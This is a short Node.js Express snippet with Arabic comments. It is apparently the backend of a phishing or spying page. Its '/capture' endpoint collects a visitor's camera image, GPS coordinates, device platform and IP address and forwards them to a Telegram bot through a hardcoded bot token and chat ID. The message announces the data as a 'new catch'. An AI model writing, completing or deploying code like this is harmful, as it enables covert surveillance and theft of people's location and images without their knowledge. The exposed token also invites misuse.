const axios = require('axios'); // أضف هذه المكتبة لرفعها
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

app.post('/capture', async (req, res) => {
    const { image, location, device } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // إرسال معلومات الجهاز والموقع نصياً
    let message = `🎯 صيد جديد!\n🌐 IP: ${ip}\n📱 جهاز: ${device.platform}\n📍 موقع: https://www.google.com/maps?q=${location.lat},${location.lon}`;
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: message
    });

    // إرسال الصورة كملف
    if (image) {
        // كود إرسال الصورة للبوت هنا
    }
    res.send("ok");
});
